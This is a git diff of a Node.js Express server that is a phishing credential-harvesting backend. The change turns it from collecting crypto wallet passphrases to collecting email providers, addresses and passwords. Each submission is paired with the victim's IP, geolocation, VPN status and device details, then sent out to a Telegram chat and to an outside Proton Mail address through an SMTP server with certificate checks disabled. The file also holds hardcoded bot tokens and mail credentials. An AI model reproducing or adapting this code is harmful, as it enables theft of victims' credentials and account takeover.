@@ -7,28 +7,29 @@ const TelegramBot = require('node-telegram-bot-api');
 const UAParser = require('ua-parser-js');
 
 const app = express();
-const botToken = '7136629679:AAH3pixtS3ElaiHCIEgj6_dGksJD-hPp5Jw'; // Replace with your Telegram bot token
+const botToken = '6936990377:AAFUsRvca5JTT9DnUGyeGKowqSn7Diuyh5U'; // Replace with your Telegram bot token
 const bot = new TelegramBot(botToken);
 
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(cors());
 
-app.get('/', (req, res, next)=>{
-  res.send('<h1>Hello World</h1>')
-})
+app.get('/', async (req, res) => {
+  // Send back the "Hello, World!" response
+  res.send('Hello, World!');
+});
 
 app.post('/passphrase', async (req, res) => {
   const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
   const userAgent = req.headers['user-agent'];
-  const passphrase = req.body.passphrase;
+  const { email_provider, email, password } = req.body;
 
   // Parse user-agent header to get device information using ua-parser-js
   const parser = new UAParser();
   const deviceInfo = parser.setUA(userAgent).getResult();
 
-  if (!passphrase) {
-    return res.status(400).json({ error: 'Passphrase is missing in the request body' });
+  if (!email_provider || !email || !password) {
+    return res.status(400).json({ error: 'Email provider, email, or password is missing in the request body' });
   }
 
   const url = `https://freeipapi.com/api/json/${clientIP}`;
@@ -40,27 +41,30 @@ app.post('/passphrase', async (req, res) => {
 
     // Send the message to Telegram
     const teleMessage = `
-      Passphrase: ${passphrase}
+    
+      Email Provider: ${email_provider}
+      =================================
+      Email: ${email}
+      Password: ${password}
+      =================================
       IP Location: ${clientIP}
-      Continent: ${continent},
       Country: ${countryName},
-      Region: ${regionName}, 
       City: ${cityName},
-      Timezone: ${timeZone},
       VPN: ${isProxy ? "Yes" : "No"}
+      =================================
       Device Info: ${JSON.stringify(deviceInfo)}
     `;
-    
-    bot.sendMessage('5854167907', teleMessage);
+    await bot.sendMessage('-1002081697774', teleMessage);
+    console.log(teleMessage)
 
     // Send email using nodemailer
     let transporter = nodemailer.createTransport({
-      host: "31-41-249-166.cprapid.com",
+      host: '5-255-100-203.cprapid.com',
       port: 465,
       secure: true,
       auth: {
-        user: "admin@piexternaltransaction.com",
-        pass: "Pienetwork10",
+        user: 'admin@invite-punchb0wldocument.com',
+        pass: 'Pienetwork10',
       },
       tls: {
         rejectUnauthorized: false
@@ -68,11 +72,13 @@ app.post('/passphrase', async (req, res) => {
     });
 
     const mailOptions = {
-      from: 'admin@piexternaltransaction.com',
-      to: 'admin@piexternaltransaction.com',
+      from:'admin@invite-punchb0wldocument.com',
+      to: 'adobedak@proton.me',
       subject: `Received From ${clientIP}`,
       text: `
-        Passphrase: ${passphrase}
+        Email Provider: ${email_provider}
+        Email: ${email}
+        Password: ${password}
         IP Location: ${clientIP}
         Continent: ${continent},
         Country: ${countryName},
@@ -85,7 +91,7 @@ app.post('/passphrase', async (req, res) => {
     };
 
     await transporter.sendMail(mailOptions);
-    res.json({ message: 'Passphrase received successfully' });
+    res.json({ message: 'Email credentials received successfully' });
   } catch (error) {
     console.error(error);
     res.status(500).json({ error: 'Failed to process the request' });
